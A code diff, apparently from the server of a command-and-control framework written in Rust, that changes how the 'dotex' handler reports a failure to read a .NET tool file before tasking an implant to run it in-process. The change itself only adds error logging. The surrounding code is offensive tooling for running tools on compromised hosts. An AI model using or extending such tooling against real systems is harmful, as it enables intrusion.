@@ -7,7 +7,9 @@ use shared::{
     tasks::{Command, DotExInner},
 };
 
-use crate::{TOOLS_PATH, admin_task_dispatch::task_agent, app_state::AppState};
+use crate::{
+    TOOLS_PATH, admin_task_dispatch::task_agent, app_state::AppState, logging::log_error_async,
+};
 
 /// Executes dotnet in the current process
 pub async fn dotex(
@@ -22,15 +24,13 @@ pub async fn dotex(
     let tool_data = match tokio::fs::read(path_to_tool).await {
         Ok(f) => f,
         Err(e) => {
-            return Some(
-                serde_json::to_value(Err::<String, String>(format!("Could not read file. {e}")))
-                    .unwrap(),
-            );
+            let msg = format!("Could not read file. {e}");
+            log_error_async(&msg).await;
+            return Some(serde_json::to_value(msg).unwrap());
         }
     };
 
     let metadata: DotExDataForImplant = (tool_data, data.args);
-
     let meta_ser = serde_json::to_string(&metadata).unwrap();
 
     let _ = task_agent(Command::DotEx, Some(meta_ser), uid.unwrap(), state).await;
